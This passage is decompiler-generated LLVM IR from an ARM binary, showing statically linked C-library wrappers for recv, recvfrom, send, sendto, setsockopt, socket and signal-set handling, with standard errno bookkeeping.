  %v4_12e00 = sext i16 %v3_12e00 to i32
  %v0_12e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e04 = sub i32 0, %v0_12e04
  store i32 %v1_12e04, i32* %r2.global-to-local, align 4
  %v3_12e08 = add i32 %v4_12e00, %v0_12dfc
  %v4_12e08 = inttoptr i32 %v3_12e08 to i32*
  store i32 %v1_12e04, i32* %v4_12e08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12e10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12e10:                               ; preds = %entry, %dec_label_pc_12df8
  %v1_12e14 = phi i32 [ %v0_12de8, %entry ], [ -1, %dec_label_pc_12df8 ]
  %v2_12e10 = phi i32 [ %v3_12ddc, %entry ], [ %v2_12e10.pre, %dec_label_pc_12df8 ]
  store i32 %v2_12e10, i32* @r7, align 4
  ret i32 %v1_12e14

; uselistorder directives
  uselistorder i32 %v0_12de8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e10, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e1c = load i32, i32* @r7, align 4
  store i32 %v3_12e1c, i32* %stack_var_-8, align 4
  %v0_12e28 = load i32, i32* @r0, align 4
  store i32 %v0_12e28, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e28, -4095
  br i1 %tmp, label %dec_label_pc_12e50, label %dec_label_pc_12e38

dec_label_pc_12e38:                               ; preds = %entry
  %v0_12e3c = call i32 @__aeabi_read_tp()
  %v3_12e40 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12e40 = sext i16 %v3_12e40 to i32
  %v0_12e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e44 = sub i32 0, %v0_12e44
  store i32 %v1_12e44, i32* %r2.global-to-local, align 4
  %v3_12e48 = add i32 %v4_12e40, %v0_12e3c
  %v4_12e48 = inttoptr i32 %v3_12e48 to i32*
  store i32 %v1_12e44, i32* %v4_12e48, align 4
  %v2_12e50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e50

dec_label_pc_12e50:                               ; preds = %entry, %dec_label_pc_12e38
  %v1_12e54 = phi i32 [ %v0_12e28, %entry ], [ -1, %dec_label_pc_12e38 ]
  %v2_12e50 = phi i32 [ %v3_12e1c, %entry ], [ %v2_12e50.pre, %dec_label_pc_12e38 ]
  store i32 %v2_12e50, i32* @r7, align 4
  ret i32 %v1_12e54

; uselistorder directives
  uselistorder i32 %v0_12e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e50, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12e58:
  %v0_12e58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12e58
  %v2_12e5c = load i32, i32* @r8, align 4
  %v5_12e5c = mul i32 %v2_12e5c, 2048
  %v6_12e5c = and i32 %v5_12e5c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e58, %bb
  %v7_12e5c = phi i32 [ %arg1, %dec_label_pc_12e58 ], [ %v6_12e5c, %bb ]
  ret i32 %v7_12e5c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e64 = load i32, i32* @r4, align 4
  store i32 %v3_12e64, i32* %stack_var_-24, align 4
  %v6_12e64 = load i32, i32* @r5, align 4
  %v9_12e64 = load i32, i32* @r6, align 4
  %v12_12e64 = load i32, i32* @r7, align 4
  %v15_12e64 = load i32, i32* @r8, align 4
  %v18_12e64 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @ip, align 4
  %v4_12e70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_12e74 = icmp eq i32 %v4_12e70, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12e74, label %dec_label_pc_12e8c, label %entry.dec_label_pc_12e94_crit_edge

entry.dec_label_pc_12e94_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12e94

dec_label_pc_12e8c:                               ; preds = %entry
  store i32 %v3_12e64, i32* @r4, align 4
  store i32 %v9_12e64, i32* @r6, align 4
  store i32 %v12_12e64, i32* @r7, align 4
  store i32 %v15_12e64, i32* @r8, align 4
  %v0_12e90 = call i32 @__sys_recv()
  br label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %entry.dec_label_pc_12e94_crit_edge, %dec_label_pc_12e8c
  %v0_12e94 = call i32 @__libc_enable_asynccancel()
  %v0_12e98 = load i32, i32* @r6, align 4
  store i32 %v0_12e98, i32* @r1, align 4
  store i32 %v0_12e94, i32* @r5, align 4
  %v0_12ea8 = load i32, i32* @r4, align 4
  store i32 %v0_12ea8, i32* @r0, align 4
  %v0_12eac = call i32 @__sys_recv()
  store i32 %v0_12eac, i32* @r4, align 4
  %v0_12eb4 = load i32, i32* @r5, align 4
  %v1_12eb8 = call i32 @__libc_disable_asynccancel(i32 %v0_12eb4)
  %v0_12ebc = load i32, i32* @r4, align 4
  %v2_12ec0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12ec0, i32* @r4, align 4
  store i32 %v6_12e64, i32* @r5, align 4
  store i32 %v9_12e64, i32* @r6, align 4
  store i32 %v12_12e64, i32* @r7, align 4
  store i32 %v15_12e64, i32* @r8, align 4
  store i32 %v18_12e64, i32* @lr, align 4
  ret i32 %v0_12ebc

; uselistorder directives
  uselistorder label %dec_label_pc_12e94, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12ed0 = load i32, i32* @r4, align 4
  store i32 %v3_12ed0, i32* %stack_var_-16, align 4
  %v0_12ee4 = load i32, i32* @r0, align 4
  store i32 %v0_12ee4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ee4, -4095
  br i1 %tmp, label %dec_label_pc_12f0c, label %dec_label_pc_12ef4

dec_label_pc_12ef4:                               ; preds = %entry
  %v0_12ef8 = call i32 @__aeabi_read_tp()
  %v3_12efc = load i16, i16* @global_var_233d0.483, align 2
  %v4_12efc = sext i16 %v3_12efc to i32
  %v0_12f00 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f00 = sub i32 0, %v0_12f00
  store i32 %v1_12f00, i32* %r2.global-to-local, align 4
  %v3_12f04 = add i32 %v4_12efc, %v0_12ef8
  %v4_12f04 = inttoptr i32 %v3_12f04 to i32*
  store i32 %v1_12f00, i32* %v4_12f04, align 4
  %v2_12f0c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12f0c

dec_label_pc_12f0c:                               ; preds = %entry, %dec_label_pc_12ef4
  %v1_12f10 = phi i32 [ %v0_12ee4, %entry ], [ -1, %dec_label_pc_12ef4 ]
  %v2_12f0c = phi i32 [ %v3_12ed0, %entry ], [ %v2_12f0c.pre, %dec_label_pc_12ef4 ]
  store i32 %v2_12f0c, i32* @r4, align 4
  ret i32 %v1_12f10

; uselistorder directives
  uselistorder i32 %v0_12ee4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f0c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12f18 = load i32, i32* @r4, align 4
  store i32 %v3_12f18, i32* %stack_var_-32, align 4
  %v6_12f18 = load i32, i32* @r5, align 4
  %v9_12f18 = load i32, i32* @r6, align 4
  %v12_12f18 = load i32, i32* @r7, align 4
  %v15_12f18 = load i32, i32* @r8, align 4
  %v18_12f18 = load i32, i32* @sb, align 4
  %v21_12f18 = load i32, i32* @sl, align 4
  %v24_12f18 = load i32, i32* @lr, align 4
  %v4_12f28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_12f30 = icmp eq i32 %v4_12f28, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12f30, label %dec_label_pc_12f50, label %dec_label_pc_12f5c

dec_label_pc_12f50:                               ; preds = %entry
  store i32 %v3_12f18, i32* @r4, align 4
  store i32 %v12_12f18, i32* @r7, align 4
  store i32 %v15_12f18, i32* @r8, align 4
  store i32 %v18_12f18, i32* %sb.global-to-local, align 4
  %v0_12f58 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_12f5c

dec_label_pc_12f5c:                               ; preds = %entry, %dec_label_pc_12f50
  %v0_12f5c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12f5c, i32* @r5, align 4
  %v0_12f70 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12f70, i32* @r0, align 4
  %v0_12f78 = call i32 @__sys_recvfrom()
  store i32 %v0_12f78, i32* @r4, align 4
  %v0_12f80 = load i32, i32* @r5, align 4
  %v1_12f84 = call i32 @__libc_disable_asynccancel(i32 %v0_12f80)
  %v0_12f88 = load i32, i32* @r4, align 4
  %v2_12f90 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12f90, i32* @r4, align 4
  store i32 %v6_12f18, i32* @r5, align 4
  store i32 %v9_12f18, i32* @r6, align 4
  store i32 %v12_12f18, i32* @r7, align 4
  store i32 %v15_12f18, i32* @r8, align 4
  store i32 %v18_12f18, i32* @sb, align 4
  store i32 %v21_12f18, i32* @sl, align 4
  store i32 %v24_12f18, i32* @lr, align 4
  ret i32 %v0_12f88

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f5c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fa0 = load i32, i32* @r7, align 4
  store i32 %v3_12fa0, i32* %stack_var_-8, align 4
  %v0_12fac = load i32, i32* @r0, align 4
  store i32 %v0_12fac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fac, -4095
  br i1 %tmp, label %dec_label_pc_12fd4, label %dec_label_pc_12fbc

dec_label_pc_12fbc:                               ; preds = %entry
  %v0_12fc0 = call i32 @__aeabi_read_tp()
  %v3_12fc4 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12fc4 = sext i16 %v3_12fc4 to i32
  store i32 %v4_12fc4, i32* @r3, align 4
  %v0_12fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12fc8 = sub i32 0, %v0_12fc8
  store i32 %v1_12fc8, i32* %r2.global-to-local, align 4
  %v3_12fcc = add i32 %v4_12fc4, %v0_12fc0
  %v4_12fcc = inttoptr i32 %v3_12fcc to i32*
  store i32 %v1_12fc8, i32* %v4_12fcc, align 4
  %v2_12fd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fd4

dec_label_pc_12fd4:                               ; preds = %entry, %dec_label_pc_12fbc
  %v1_12fd8 = phi i32 [ %v0_12fac, %entry ], [ -1, %dec_label_pc_12fbc ]
  %v2_12fd4 = phi i32 [ %v3_12fa0, %entry ], [ %v2_12fd4.pre, %dec_label_pc_12fbc ]
  store i32 %v2_12fd4, i32* @r7, align 4
  ret i32 %v1_12fd8

; uselistorder directives
  uselistorder i32 %v0_12fac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fd4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12fdc:
  %v0_12fdc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fdc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12fdc
  %v2_12fe0 = load i32, i32* @r4, align 4
  %v5_12fe0 = mul i32 %v2_12fe0, 256
  %v6_12fe0 = and i32 %v5_12fe0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12fdc, %bb
  %v7_12fe0 = phi i32 [ %arg1, %dec_label_pc_12fdc ], [ %v6_12fe0, %bb ]
  ret i32 %v7_12fe0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12fe8 = load i32, i32* @r4, align 4
  store i32 %v3_12fe8, i32* %stack_var_-24, align 4
  %v6_12fe8 = load i32, i32* @r5, align 4
  %v9_12fe8 = load i32, i32* @r6, align 4
  %v12_12fe8 = load i32, i32* @r7, align 4
  %v15_12fe8 = load i32, i32* @r8, align 4
  %v18_12fe8 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @ip, align 4
  %v4_12ff4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_12ff8 = icmp eq i32 %v4_12ff4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12ff8, label %dec_label_pc_13010, label %entry.dec_label_pc_13018_crit_edge

entry.dec_label_pc_13018_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13018

dec_label_pc_13010:                               ; preds = %entry
  store i32 %v3_12fe8, i32* @r4, align 4
  store i32 %v9_12fe8, i32* @r6, align 4
  store i32 %v12_12fe8, i32* @r7, align 4
  store i32 %v15_12fe8, i32* @r8, align 4
  %v0_13014 = call i32 @__sys_send()
  br label %dec_label_pc_13018

dec_label_pc_13018:                               ; preds = %entry.dec_label_pc_13018_crit_edge, %dec_label_pc_13010
  %v0_13018 = call i32 @__libc_enable_asynccancel()
  %v0_1301c = load i32, i32* @r6, align 4
  store i32 %v0_1301c, i32* @r1, align 4
  store i32 %v0_13018, i32* @r5, align 4
  %v0_13028 = load i32, i32* @r8, align 4
  store i32 %v0_13028, i32* @r3, align 4
  %v0_1302c = load i32, i32* @r4, align 4
  store i32 %v0_1302c, i32* @r0, align 4
  %v0_13030 = call i32 @__sys_send()
  store i32 %v0_13030, i32* @r4, align 4
  %v0_13038 = load i32, i32* @r5, align 4
  %v1_1303c = call i32 @__libc_disable_asynccancel(i32 %v0_13038)
  %v0_13040 = load i32, i32* @r4, align 4
  %v2_13044 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13044, i32* @r4, align 4
  store i32 %v6_12fe8, i32* @r5, align 4
  store i32 %v9_12fe8, i32* @r6, align 4
  store i32 %v12_12fe8, i32* @r7, align 4
  store i32 %v15_12fe8, i32* @r8, align 4
  store i32 %v18_12fe8, i32* @lr, align 4
  ret i32 %v0_13040

; uselistorder directives
  uselistorder label %dec_label_pc_13018, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13054 = load i32, i32* @r4, align 4
  store i32 %v3_13054, i32* %stack_var_-16, align 4
  %v0_13068 = load i32, i32* @r0, align 4
  store i32 %v0_13068, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13068, -4095
  br i1 %tmp, label %dec_label_pc_13090, label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %entry
  %v0_1307c = call i32 @__aeabi_read_tp()
  %v3_13080 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13080 = sext i16 %v3_13080 to i32
  %v0_13084 = load i32, i32* %r2.global-to-local, align 4
  %v1_13084 = sub i32 0, %v0_13084
  store i32 %v1_13084, i32* %r2.global-to-local, align 4
  %v3_13088 = add i32 %v4_13080, %v0_1307c
  %v4_13088 = inttoptr i32 %v3_13088 to i32*
  store i32 %v1_13084, i32* %v4_13088, align 4
  %v2_13090.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %entry, %dec_label_pc_13078
  %v1_13094 = phi i32 [ %v0_13068, %entry ], [ -1, %dec_label_pc_13078 ]
  %v2_13090 = phi i32 [ %v3_13054, %entry ], [ %v2_13090.pre, %dec_label_pc_13078 ]
  store i32 %v2_13090, i32* @r4, align 4
  ret i32 %v1_13094

; uselistorder directives
  uselistorder i32 %v0_13068, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13090, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13098:
  %v0_13098 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13098, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13098
  %v2_1309c = load i32, i32* @r8, align 4
  %v5_1309c = sdiv i32 %v2_1309c, 64
  %v6_1309c = and i32 %v5_1309c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13098, %bb
  %v7_1309c = phi i32 [ %arg1, %dec_label_pc_13098 ], [ %v6_1309c, %bb ]
  ret i32 %v7_1309c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_130a0 = load i32, i32* @r4, align 4
  store i32 %v3_130a0, i32* %stack_var_-32, align 4
  %v6_130a0 = load i32, i32* @r5, align 4
  %v9_130a0 = load i32, i32* @r6, align 4
  %v12_130a0 = load i32, i32* @r7, align 4
  %v15_130a0 = load i32, i32* @r8, align 4
  %v18_130a0 = load i32, i32* @sb, align 4
  %v21_130a0 = load i32, i32* @sl, align 4
  %v24_130a0 = load i32, i32* @lr, align 4
  %v4_130b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_130b8 = icmp eq i32 %v4_130b0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_130b8, label %dec_label_pc_130d8, label %dec_label_pc_130e4

dec_label_pc_130d8:                               ; preds = %entry
  store i32 %v3_130a0, i32* @r4, align 4
  store i32 %v12_130a0, i32* @r7, align 4
  store i32 %v15_130a0, i32* @r8, align 4
  store i32 %v18_130a0, i32* %sb.global-to-local, align 4
  %v0_130e0 = call i32 @__sys_sendto()
  br label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %entry, %dec_label_pc_130d8
  %v0_130e4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_130e4, i32* @r5, align 4
  %v0_130f8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_130f8, i32* @r0, align 4
  %v0_13100 = call i32 @__sys_sendto()
  store i32 %v0_13100, i32* @r4, align 4
  %v0_13108 = load i32, i32* @r5, align 4
  %v1_1310c = call i32 @__libc_disable_asynccancel(i32 %v0_13108)
  %v0_13110 = load i32, i32* @r4, align 4
  %v2_13118 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13118, i32* @r4, align 4
  store i32 %v6_130a0, i32* @r5, align 4
  store i32 %v9_130a0, i32* @r6, align 4
  store i32 %v12_130a0, i32* @r7, align 4
  store i32 %v15_130a0, i32* @r8, align 4
  store i32 %v18_130a0, i32* @sb, align 4
  store i32 %v21_130a0, i32* @sl, align 4
  store i32 %v24_130a0, i32* @lr, align 4
  ret i32 %v0_13110

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13128 = load i32, i32* @r4, align 4
  store i32 %v3_13128, i32* %stack_var_-12, align 4
  %v0_13138 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13138, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13138, -4095
  br i1 %tmp, label %dec_label_pc_13160, label %dec_label_pc_13148

dec_label_pc_13148:                               ; preds = %entry
  %v0_1314c = call i32 @__aeabi_read_tp()
  %v3_13150 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13150 = sext i16 %v3_13150 to i32
  store i32 %v4_13150, i32* @r3, align 4
  %v0_13154 = load i32, i32* %r2.global-to-local, align 4
  %v1_13154 = sub i32 0, %v0_13154
  store i32 %v1_13154, i32* %r2.global-to-local, align 4
  %v3_13158 = add i32 %v4_13150, %v0_1314c
  %v4_13158 = inttoptr i32 %v3_13158 to i32*
  store i32 %v1_13154, i32* %v4_13158, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13160.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13160

dec_label_pc_13160:                               ; preds = %entry, %dec_label_pc_13148
  %v1_13164 = phi i32 [ %v0_13138, %entry ], [ -1, %dec_label_pc_13148 ]
  %v2_13160 = phi i32 [ %v3_13128, %entry ], [ %v2_13160.pre, %dec_label_pc_13148 ]
  store i32 %v2_13160, i32* @r4, align 4
  ret i32 %v1_13164

; uselistorder directives
  uselistorder i32 %v0_13138, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13160, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13168:
  %v0_13168 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13168, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13168
  %v2_1316c = load i32, i32* @r8, align 4
  %v4_1316c = lshr i32 %v2_1316c, %arg3
  %v5_1316c = sub i32 32, %arg3
  %v6_1316c = shl i32 %v2_1316c, %v5_1316c
  %v7_1316c = or i32 %v6_1316c, %v4_1316c
  %v9_1316c = and i32 %v7_1316c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13168, %bb
  %v10_1316c = phi i32 [ %arg1, %dec_label_pc_13168 ], [ %v9_1316c, %bb ]
  ret i32 %v10_1316c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13170 = load i32, i32* @r7, align 4
  store i32 %v3_13170, i32* %stack_var_-8, align 4
  %v0_1317c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1317c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1317c, -4095
  br i1 %tmp, label %dec_label_pc_131a4, label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %entry
  %v0_13190 = call i32 @__aeabi_read_tp()
  %v3_13194 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13194 = sext i16 %v3_13194 to i32
  store i32 %v4_13194, i32* @r3, align 4
  %v0_13198 = load i32, i32* %r2.global-to-local, align 4
  %v1_13198 = sub i32 0, %v0_13198
  store i32 %v1_13198, i32* %r2.global-to-local, align 4
  %v3_1319c = add i32 %v4_13194, %v0_13190
  %v4_1319c = inttoptr i32 %v3_1319c to i32*
  store i32 %v1_13198, i32* %v4_1319c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_131a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_131a4

dec_label_pc_131a4:                               ; preds = %entry, %dec_label_pc_1318c
  %v1_131a8 = phi i32 [ %v0_1317c, %entry ], [ -1, %dec_label_pc_1318c ]
  %v2_131a4 = phi i32 [ %v3_13170, %entry ], [ %v2_131a4.pre, %dec_label_pc_1318c ]
  store i32 %v2_131a4, i32* @r7, align 4
  ret i32 %v1_131a8

; uselistorder directives
  uselistorder i32 %v0_1317c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131a4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_131ac:
  %v0_131ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_131ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_131ac
  %v2_131b0 = load i32, i32* @r4, align 4
  %v8_131b0 = lshr i32 %v2_131b0, %arg3
  %v9_131b0 = and i32 %v8_131b0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_131ac, %bb
  %v10_131b0 = phi i32 [ %arg1, %dec_label_pc_131ac ], [ %v9_131b0, %bb ]
  ret i32 %v10_131b0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_131cc, label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %entry
  %v7_131c8 = icmp slt i32 %arg2, 65
  br i1 %v7_131c8, label %dec_label_pc_131e8, label %dec_label_pc_131cc

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131c4, %entry
  %v0_131d0 = call i32 @__aeabi_read_tp()
  %v3_131d4 = load i16, i16* @global_var_233d0.483, align 2
  %v4_131d4 = sext i16 %v3_131d4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_131e0 = add i32 %v4_131d4, %v0_131d0
  %v4_131e0 = inttoptr i32 %v3_131e0 to i32*
  store i32 22, i32* %v4_131e0, align 4
  %v0_131f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131c4
  %v0_131e8 = call i32 @__sigaddset()
  store i32 %v0_131e8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %dec_label_pc_131cc, %dec_label_pc_131e8
  %v0_131f0 = phi i32 [ %v0_131f0.pre, %dec_label_pc_131cc ], [ %v0_131e8, %dec_label_pc_131e8 ]
  ret i32 %v0_131f0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131f0, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1320c = add i32 %tmp, 4
  %v3_1320c = inttoptr i32 %v2_1320c to i32*
  store i32 0, i32* %v3_1320c, align 4
  %v1_13210 = load i32, i32* %r3.global-to-local, align 4
  %v2_13210 = inttoptr i32 %v1_13210 to i32*
  store i32 0, i32* %v2_13210, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13218 = load i32, i32* @r4, align 4
  store i32 %v3_13218, i32* %stack_var_-16, align 4
  %v6_13218 = load i32, i32* @r5, align 4
  %v9_13218 = load i32, i32* @r6, align 4
  %v7_13220 = icmp eq i32 %arg2, -1
  br i1 %v7_13220, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13228 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13244

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_1324c

dec_label_pc_13244:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  %v7_13248 = icmp slt i32 %arg1, 65
  br i1 %v7_13248, label %dec_label_pc_13268, label %dec_label_pc_1324c

dec_label_pc_1324c:                               ; preds = %.thread16, %dec_label_pc_13244
  %v0_13250 = call i32 @__aeabi_read_tp()
  %v3_13254 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13254 = sext i16 %v3_13254 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
